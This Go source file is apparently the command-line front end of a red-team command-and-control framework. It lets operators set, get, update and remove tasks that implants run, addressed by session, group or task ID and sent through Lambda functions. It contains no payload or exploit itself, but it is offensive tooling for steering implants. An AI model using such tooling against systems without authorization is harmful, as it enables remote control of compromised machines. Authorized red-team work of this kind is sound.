package cli

import (
	"fmt"
	"os"

	"github.com/akamensky/argparse"
	"github.com/bluesentinelsec/rednimbusc2/pkg/tasker"
	log "github.com/sirupsen/logrus"
)

// CLI variables
// give these file-scope so
// we don't need to pass 8+ args
// to functions
var parser *argparse.Parser
var sessionIDFlag *string
var groupFlag *string
var taskIDFlag *string
var cmdFlag *string
var argsFlag *string
var execTimeFlag *string
var keyEnvFlag *string

func InvokeCLI(args []string) {

	parser = argparse.NewParser(args[0], "TBD")

	// top level commands - red operators will invoke
	// these commands to control implant behavior
	setTaskCmd := parser.NewCommand("set-task", "TBD")
	getTaskCmd := parser.NewCommand("get-task", "TBD")
	updateTaskCmd := parser.NewCommand("update-task", "TBD")
	removeTaskCmd := parser.NewCommand("remove-task", "TBD")

	// arguments that modify command behavior
	sessionIDFlag = parser.String("s", "session-id", &argparse.Options{Required: false, Help: "TBD"})
	groupFlag = parser.String("g", "session-group", &argparse.Options{Required: false, Help: "TBD"})
	taskIDFlag = parser.String("i", "task-id", &argparse.Options{Required: false, Help: "TBD"})
	cmdFlag = parser.String("c", "cmd", &argparse.Options{Required: false, Help: "TBD"})
	argsFlag = parser.String("a", "args", &argparse.Options{Required: false, Help: "TBD"})
	execTimeFlag = parser.String("t", "time", &argparse.Options{Required: false, Help: "TBD"})
	keyEnvFlag = parser.String("k", "key-env", &argparse.Options{Required: false, Help: "TBD"})

	// Parse input
	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
	}

	// setup console logging
	log.SetLevel(log.DebugLevel)

	if setTaskCmd.Happened() {
		log.Debug("invoke set-task")
		invokeSetLambdaTask()
	}

	if getTaskCmd.Happened() {
		log.Debug("invoke get-task")
		invokeGetLambdaTask()
	}

	if updateTaskCmd.Happened() {
		log.Debug("invoke update-task")
		invokeUpdateLambdaTask()
	}

	if removeTaskCmd.Happened() {
		log.Debug("invoke remove-task")
		invokeRemoveLambdaTask()
	}
}

func configureTaskObject() *tasker.TaskObject {
	taskObj := tasker.NewTask()
	taskObj.SetKeyEnv(*keyEnvFlag)
	taskObj.SetSessionID(*sessionIDFlag)
	taskObj.SetGroupName(*groupFlag)
	taskObj.SetExecTime(*execTimeFlag)
	taskObj.SetImplantTask(*cmdFlag)
	taskObj.SetArguments(*argsFlag)
	return taskObj
}

// invokeSetLambdaTask creates a task
// object based on the CLI arguments
// and then invokes the
// Set Task Lambda function.
func invokeSetLambdaTask() {

	taskObj := configureTaskObject()
	tasker.SetLambdaTask(taskObj)
}

func invokeUpdateLambdaTask() {

	taskObj := configureTaskObject()
	tasker.UpdateLambdaTask(taskObj)
}

func invokeRemoveLambdaTask() {

	if *taskIDFlag != "" {
		tasker.RemoveLambdaTaskWithID(*taskIDFlag)

	} else if *groupFlag != "" {
		tasker.RemoveLambdaTaskWithGroup(*groupFlag)

	} else {
		tasker.RemoveLambdaTaskAll()
	}
}

func invokeGetLambdaTask() {

	if *taskIDFlag != "" {
		tasker.GetLambdaTaskFromID(*taskIDFlag)

	} else if *groupFlag != "" {
		tasker.GetLambdaTaskFromGroup(*groupFlag)

	} else {
		tasker.GetLambdaTaskAll()
	}
}
